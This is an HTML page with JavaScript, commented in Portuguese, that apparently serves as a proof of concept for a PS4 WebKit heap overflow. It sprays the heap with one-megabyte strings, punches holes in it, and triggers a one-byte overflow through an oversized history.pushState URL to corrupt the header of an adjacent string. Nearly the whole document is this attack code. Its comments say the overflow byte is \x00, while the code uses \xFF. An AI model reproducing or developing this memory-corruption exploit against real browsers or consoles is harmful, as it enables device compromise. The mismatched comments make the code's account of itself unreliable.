<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Nano-Surgery (1 Byte)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        .log { margin-bottom: 5px; border-bottom: 1px dashed #333; }
        .success { color: #fff; background: #c00; font-weight: bold; padding: 5px; font-size: 1.2em; }
    </style>
</head>
<body>

<h2>WebKit Heap: Nano-Surgery Test (1 Byte)</h2>
<p>Target: Corrupt adjacent header LSB without PANIC.</p>
<p>Payload: 709,522 bytes + <strong>1 Byte Overflow (\x00)</strong></p>

<button onclick="runTest()" style="padding: 15px; cursor:pointer;">INICIAR TESTE DE 1 BYTE</button>
<div id="log" style="margin-top:20px;"></div>

<script>
    // Configuração idêntica ao teste anterior (que garantiu a colisão)
    const MB = 1024 * 1024;
    const VICTIM_SIZE = MB; 
    const SPRAY_COUNT = 512; 
    
    var victims = new Array(SPRAY_COUNT);
    
    function log(msg, type="") {
        const el = document.getElementById('log');
        el.innerHTML = `<div class="log ${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>` + el.innerHTML;
    }

    function runTest() {
        document.getElementById('log').innerHTML = "";
        
        // 1. SPRAY
        log("1. Alocando vítimas (1MB)...");
        for (let i = 0; i < SPRAY_COUNT; i++) {
            // Header identificável para sabermos qual mudou
            let header = `ID:${i}-`; 
            let padding = "B".repeat(VICTIM_SIZE - header.length);
            victims[i] = header + padding;
        }

        // 2. HOLES (Buracos)
        log("2. Criando buracos...");
        // Mantemos o mesmo padrão que funcionou antes
        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i += 4) {
            victims[i] = null;
        }
        
        // GC Force
        for(let k=0; k<150; k++) { new ArrayBuffer(0x20000); }

        // 3. TRIGGER DELICADO
        setTimeout(() => {
            log("3. Disparando 1 BYTE OVERFLOW (\x00)...");
            
            const SAFE_SIZE = 709522; 
            const BASE = "A".repeat(SAFE_SIZE);
            
            // AQUI ESTÁ O REFINAMENTO:
            // Usamos apenas 1 byte.
            // Usamos \x00 (Null) para tentar "zerar" o bit de tamanho do vizinho
            // em vez de colocar lixo aleatório.
            const OVERFLOW = "\xFF"; 
            
            const payload = "/" + BASE + OVERFLOW;

            try {
                history.pushState({}, "poc", payload);
                log("Trigger enviado. Verificando vítimas...");
                check();
            } catch(e) {
                log("Erro: " + e.message);
            }
        }, 1500);
    }

    function check() {
        let found = false;
        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i++) {
            if (victims[i] !== null) {
                let v = victims[i];
                
                // Se corrompermos o cabeçalho com \x00, o tamanho (length)
                // da string reportado pelo JS vai mudar drasticamente.
                if (v.length !== VICTIM_SIZE) {
                    log(`⚡ SUCESSO! Vítima ${i} alterada!`, "success");
                    log(`Tamanho Original: ${VICTIM_SIZE}`, "success");
                    log(`Tamanho Novo:     ${v.length}`, "success");
                    found = true;
                    // IMPORTANTE: Não tente ler o conteúdo (charCodeAt) se o tamanho mudou,
                    // pois pode crashar o browser ao acessar memória inválida.
                    // O tamanho errado JÁ É A PROVA.
                    break;
                }
            }
        }
        
        if (!found) log("Nenhuma mudança detectada. O byte \x00 pode ter sido ignorado ou absorvido.");
    }
</script>
</body>
</html>

